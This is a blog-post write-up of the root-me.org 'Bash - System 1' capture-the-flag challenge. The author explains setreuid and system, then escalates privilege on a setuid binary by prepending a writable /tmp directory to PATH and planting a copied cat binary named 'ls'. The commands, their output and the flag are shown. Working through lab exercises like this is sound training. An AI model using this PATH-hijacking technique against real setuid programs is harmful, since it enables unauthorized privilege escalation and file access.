@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GX2L7MWQLN"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GX2L7MWQLN');
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+  <script>
+    window.MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+        fontCache: 'global'
+      }
+    };
+  </script>
+  
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <style>
+          .MathJax {
+  font-size: 180%; /* Adjust the percentage as needed */
+}
+  </style>
+
+  <title>Bash - System 1 - root-me.org</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Bash - System 1 - root-me.org | Cecil Daemon’s Wish</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Bash - System 1 - root-me.org" />
+<meta name="author" content="J. Alex Buschinelli" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:4000/bash-system-1-root-me" />
+<meta property="og:url" content="http://localhost:4000/bash-system-1-root-me" />
+<meta property="og:site_name" content="Cecil Daemon’s Wish" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-12-04T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Bash - System 1 - root-me.org" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J. Alex Buschinelli","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2023-12-04T00:00:00+00:00","datePublished":"2023-12-04T00:00:00+00:00","description":"Introduction","headline":"Bash - System 1 - root-me.org","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/bash-system-1-root-me"},"url":"http://localhost:4000/bash-system-1-root-me"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <div style="display: flex; justify-content: center; align-items: center; text-decoration: none;">
+      <a href="/" style="display: flex; align-items: center; text-decoration: none;">
+          <img src="/assets/cecil.gif" alt="Cecil Daemon" style="margin-right: 20px;"/>
+          
+          
+          <h1>cecil@celestial:/bash-system-1-root-me$</h1>
+      
+      </a>
+  </div>
+  <br>
+    </a>
+    <div class="header-links">
+      <a href="/"><h2 class="header-link">Home</h2></a>
+<a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Bash - System 1 - root-me.org</h2>
+  <time datetime="2023-12-04T00:00:00+00:00" class="by-line">04 Dec 2023</time>
+  <p>Estimated read time: 8 minutes</p>
+  <h1 id="introduction"><a href="#intro"></a>Introduction</h1>
+
+<p><a href="https://www.root-me.org">Root-me</a> is a CTF website that tries to gamify learning topics by giving different types of challenges across many different areas in cybersecurity. This was one of my first contacts with CTFs, back in December 2022. Since I had already solved some of the challenges at that time, I decided to go back to re-solve them, and give them a proper write-up this time (why not?)</p>
+
+<p>The categories on the website are under the challenges tab. In this post, we’ll be solving the App Script category’s Bash System 1, the very first challenge. Let’s jump right into it!</p>
+
+<h1 id="challenge-description"><a href="#level-description"></a>Challenge description</h1>
+
+<p>Differently from Pwnable, the challenges under Root-me display a ‘Statement’ and ‘Connection information’. The ‘Statement’, usually composed of the CTF objective, showcases a script to which we need to exploit. The source code is already available even before sshing:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>    <span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span>    <span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>     
+    <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"ls /challenge/app-script/ch11/.passwd"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>To connect to the room, we need to SSH or use their WebSSH. I’d much rather use SSH from my local machine, though their WebSSH also works. The command for this challenge is:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ssh -p 2222 app-script-ch11@challenge02.root-me.org</code></p>
+
+<p>and the password is <code class="language-plaintext highlighter-rouge">app-script-ch11</code>.</p>
+
+<h1 id="approach-mindset"><a href="#approach"></a>Approach mindset</h1>
+
+<p>Although this is a different CTF website, we will use the same approach mindset we have been using so far. This not only helps us to maintain a certain organized step-by-step to solve CTFs, but also actually increases the probability of learning how to engage in any kind of hacking-related topic.</p>
+
+<p>In this CTF, the first thing we can understand by looking at the C code above is that there is probably a file <code class="language-plaintext highlighter-rouge">.passwd</code> inside <code class="language-plaintext highlighter-rouge">/challenge/app-script/ch11</code> directory. The code seems to be using <code class="language-plaintext highlighter-rouge">system</code> to run the <code class="language-plaintext highlighter-rouge">ls</code> command at the file.</p>
+
+<h2 id="step-1---understanding-basic-concepts"><a href="#mindset-step1"></a>Step 1 - Understanding basic concepts</h2>
+
+<p>What are the basic concepts in this CTF? Well, in our case here, this will simply be to investigate what the functions used in the above script are for. For that matter, we will need to do a little C programming research.</p>
+
+<h3 id="setreuid">setreuid</h3>
+
+<p>According to the Linux manual page, this function takes two unsigned integer arguments: the real user id and the effective user id. Put in simple Linux terms, the ‘real user id’ is who you really are within the system (the one who owns the process); while the ‘effective user id’ is what the operating system looks at to make a decision whether or not you are allowed to do something.</p>
+
+<p>Here’s a break down of what the function does, according to the <a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">Linux manual page</a>:</p>
+
+<blockquote>
+  <p>Unprivileged processes may only set the effective user ID to the real user ID, the effective user ID, or the saved set-user-ID.</p>
+
+  <p>Unprivileged users may only set the real user ID to the real user ID or the effective user ID.</p>
+
+  <p>If the real user ID is set (i.e., ruid is not -1) or the effective user ID is set to a value not equal to the previous real user ID, the saved set-user-ID will be set to the new effective user ID.</p>
+</blockquote>
+
+<p>The two arguments provided by the code are the same: <code class="language-plaintext highlighter-rouge">geteuid()</code>. According to the Linux manual page:</p>
+
+<blockquote>
+  <p>geteuid() returns the effective user ID of the calling process.</p>
+</blockquote>
+
+<p>This basically means that whoever owns the above C script, the code will run it as that owner (and its privileges).</p>
+
+<h3 id="system">system</h3>
+
+<p>This function passes a command name or program name specified by a string to the host environment. The command processor then executes the passed command and returns after it has been completed.</p>
+
+<p>Linking with the previous function: the code interprets the script/binary owner’s privileges and runs the command with those privileges.</p>
+
+<h2 id="step-2---understanding-the-problem"><a href="#mindset-step2"></a>Step 2 - Understanding the problem</h2>
+
+<p>Now that we understand the basic concepts of this CTF script, we are ready to broaden up our view by relating it to the actual CTF. Let’s ssh into the machine and take a look around using the <code class="language-plaintext highlighter-rouge">ls -la</code> command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 36
+dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 <span class="nb">.</span>
+drwxr-xr-x 25 root                    root            4096 Sep  5 14:00 ..
+<span class="nt">-r--------</span>  1 root                    root             775 Dec 10  2021 ._perms
+<span class="nt">-rw-r-----</span>  1 root                    root              43 Dec 10  2021 .git
+<span class="nt">-r--------</span>  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd
+<span class="nt">-r--r-----</span>  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
+<span class="nt">-r-sr-x---</span>  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
+<span class="nt">-r--r-----</span>  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
+</code></pre></div></div>
+
+<p>followed by this command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:~<span class="nv">$ </span><span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">groups </span>app-script-ch11
+app-script-ch11
+app-script-ch11 : app-script-ch11 <span class="nb">users</span>
+</code></pre></div></div>
+
+<p>The output of these commands tell us we are part of most files’ group, but are not the <code class="language-plaintext highlighter-rouge">app-script-ch1-cracked</code> user. As a consequence, we are not able to read the contents of <code class="language-plaintext highlighter-rouge">.passwd</code>, unless we somehow acquire the <code class="language-plaintext highlighter-rouge">app-script-ch11-cracked</code> user’s priveleges.</p>
+
+<p>We can, however, execute the <code class="language-plaintext highlighter-rouge">ch11</code> binary, with a possible exploitation of the <code class="language-plaintext highlighter-rouge">setreuid</code> and <code class="language-plaintext highlighter-rouge">system</code> functions. Note that the binary <code class="language-plaintext highlighter-rouge">ch11</code> has the SUID bit set, meaning that when running, it’ll assume the owner’s file effective user id.</p>
+
+<p>The SUID bit set is a special permission that applies to scripts or applications. If the SUID bit is set, the script/application effective’s UID becomes that of the owner of the file, instead of the user running it.</p>
+
+<p>However, this only results in running the <code class="language-plaintext highlighter-rouge">ls</code> command, which is useless in this case. Ideally, we would want the command inside the <code class="language-plaintext highlighter-rouge">system</code> function to be <code class="language-plaintext highlighter-rouge">cat</code>.</p>
+
+<p>The key to solve this problem is to trick the program into thinking it ran <code class="language-plaintext highlighter-rouge">ls</code> command, but actually runs the <code class="language-plaintext highlighter-rouge">cat</code> command. There are a few ways we can try to do this, and that’s what we will discuss next.</p>
+
+<h2 id="step-3---crafting-the-attack"><a href="#mindset-step3"></a>Step 3 - Crafting the attack</h2>
+
+<p>Let’s try to solve the challenge by applying what we’ve learned so far and putting into test our assumption of tricking the program to run <code class="language-plaintext highlighter-rouge">cat</code> instead of <code class="language-plaintext highlighter-rouge">ls</code>. First, let’s see where the <code class="language-plaintext highlighter-rouge">ls</code> command is being run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:~<span class="nv">$ </span>which <span class="nb">ls</span>
+/bin/ls
+</code></pre></div></div>
+
+<p>followed by the $PATH variable:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
+</code></pre></div></div>
+
+<p>Ok. This tells us the <code class="language-plaintext highlighter-rouge">ls</code> command is being run under the <code class="language-plaintext highlighter-rouge">/bin</code> path. But what if we had another <code class="language-plaintext highlighter-rouge">ls</code> command referenced in our $PATH variable? If the order of our new <code class="language-plaintext highlighter-rouge">ls</code> command path comes first then the <code class="language-plaintext highlighter-rouge">/bin</code> path, then the system will prioritize that path instead.</p>
+
+<p>I doubt we have write permissions in any of these paths, so we might as well find a directory that we can write a maliciously crafted <code class="language-plaintext highlighter-rouge">ls</code> command AND that this new path is added to our $PATH variable, listed before the <code class="language-plaintext highlighter-rouge">/bin</code> path.</p>
+
+<p>An usual choice for that is the <code class="language-plaintext highlighter-rouge">/tmp</code> directory, which usually gives write permissions to any user:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:~<span class="nv">$ </span><span class="nb">mkdir</span> /tmp/cecil-daemon
+app-script-ch11@challenge02:~<span class="nv">$ </span><span class="nb">cd</span> /tmp/cecil-daemon <span class="o">&amp;&amp;</span> <span class="nb">ls</span> <span class="nt">-la</span>
+total 0
+drwxr-x---   2 app-script-ch11 app-script-ch11   40 Dec  5 01:17 <span class="nb">.</span>
+drwxrwx-wt 256 root            root            7220 Dec  5 01:17 ..
+</code></pre></div></div>
+
+<p>We successfully created a directory inside <code class="language-plaintext highlighter-rouge">/tmp</code> and, as we can see, we have write permissions on it. Now, we want to add this new directory to our path variable:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:/tmp/cecil-daemon<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp/cecil-daemon:<span class="nv">$PATH</span>
+app-script-ch11@challenge02:/tmp/cecil-daemon<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/tmp/cecil-daemon:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
+</code></pre></div></div>
+
+<p>Amazing! Our new directory <code class="language-plaintext highlighter-rouge">/tmp/cecil-daemon</code> is now under the $PATH variable, and it is listed before <code class="language-plaintext highlighter-rouge">/bin</code>. Now, we need to create a binary called <code class="language-plaintext highlighter-rouge">ls</code> that instead of having the <code class="language-plaintext highlighter-rouge">ls</code> command, it has the <code class="language-plaintext highlighter-rouge">cat</code> command. Let’s try it out!</p>
+
+<h2 id="step-4---solving"><a href="#mindset-step4"></a>Step 4 - Solving!</h2>
+
+<p>We need to check where the <code class="language-plaintext highlighter-rouge">cat</code> command is being executed from. This can be achieved by running:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:/tmp/cecil-daemon<span class="nv">$ </span>which <span class="nb">cat</span>
+/bin/cat
+</code></pre></div></div>
+
+<p>My first attempt to craft a malicious <code class="language-plaintext highlighter-rouge">ls</code> is by simply copying the <code class="language-plaintext highlighter-rouge">cat</code> binary from <code class="language-plaintext highlighter-rouge">/bin</code> to <code class="language-plaintext highlighter-rouge">/tmp/cecil-daemon</code> under the name of <code class="language-plaintext highlighter-rouge">ls</code>. This should force the <code class="language-plaintext highlighter-rouge">ls</code> to always run the <code class="language-plaintext highlighter-rouge">cat</code> command instead.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:/tmp/cecil-daemon<span class="nv">$ </span><span class="nb">cp</span> /bin/cat ./ls 
+</code></pre></div></div>
+
+<p>As a test, we can run our malicious <code class="language-plaintext highlighter-rouge">ls</code> to read a file’s contents:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:/tmp/cecil-daemon<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"test"</span> <span class="o">&gt;</span> test.txt
+app-script-ch11@challenge02:/tmp/cecil-daemon<span class="nv">$ </span>./ls test.txt
+<span class="nb">test</span>
+</code></pre></div></div>
+
+<p>It seems to be working! Now, let’s go back to our home directory and run the binary. If everything was done correctly, we will be able to see the contents of <code class="language-plaintext highlighter-rouge">.passwd</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app-script-ch11@challenge02:/tmp/cecil-daemon<span class="nv">$ </span><span class="nb">cd</span> - 
+/challenge/app-script/ch11
+app-script-ch11@challenge02:~<span class="nv">$ </span>./ch11
+<span class="o">!</span>oPe96a/.s8d5
+</code></pre></div></div>
+
+<p>We did it! Enjoy the feeling of owning and tricking a system!</p>
+
+<h1 id="conclusion"><a href="#conclusions"></a>Conclusion</h1>
+
+<p>In this CTF, we learned a bit more about system misconfigurations and misuse of C functions. We started by understanding the core concepts used by the challenge script, then we tackled the problem by understanding why these were a problem in the CTF context.</p>
+
+<p>After understanding how the CTF was revolving about, we needed to create an attack vector. In our case, that was possible because we had write permissions in the <code class="language-plaintext highlighter-rouge">/tmp</code> directory and access to change the $PATH variable to our own gains. Combining the misconfigurations with a little out-of-the-box thinking, we were able to craft a malicious <code class="language-plaintext highlighter-rouge">ls</code> command that mimicked the <code class="language-plaintext highlighter-rouge">cat</code> command - the one we wanted to use.</p>
+
+<p>It is always good practice to understand what is happening before jumping into testing. This kind of approach makes things easier, as well as making the solution clearer most of the times.</p>
+
+<p>Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your <strong>research!</strong></p>
+
+<p><a href="/">Go back</a></p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Alex Buschinelli</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
